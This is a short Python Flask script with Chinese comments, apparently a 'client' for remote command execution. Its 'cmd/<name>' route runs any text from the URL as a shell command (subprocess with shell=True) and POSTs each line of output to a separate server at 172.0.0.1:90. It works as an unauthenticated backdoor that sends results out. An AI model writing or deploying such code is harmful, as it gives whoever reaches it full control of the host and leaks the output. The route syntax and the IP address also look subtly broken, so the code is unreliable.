# -*- coding:utf-8 -*-
"""
作者：shinian
创建日期：2024/5/19 22:33
"""
import subprocess
import time

import requests
from flask import Flask

app = Flask(__name__)
# 客户端
@app.route('cmd/<name>')
def cmd(name):
    screenData = subprocess.Popen(name, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)  # stage
    # subprocesses最后完成的内容是一个文件对象
    # date：我们输入的命令，shell:1、识别计算机的操作系统|2、根据操作系统自动调用命令行

    # 不知道到底有多少行就直接用循环对每一条进行处理
    while True:
        # 一行一行的读取文件内容
        line = screenData.stdout.readline()
        print(line)
        # 解码
        m_stdout = line.decode('gbk')
        if line == b'':
            # 如果一行文本什么都没有
            screenData.stdout.close()
            # 跳出文件处理的循环，但不退出连接
            break
        dem_stdout = line.decode('gbk').encode('utf-8')
        print(dem_stdout)
        print(m_stdout)
        uid = time.time()
        requests.post("http://172.0.0.1:90/result/", data={'name': dem_stdout})
        requests.post("http://172.0.0.1:90/info/", data={'uid': uid})

    # 跳出文件处理的循环，但不是退出连接
    return str(m_stdout)
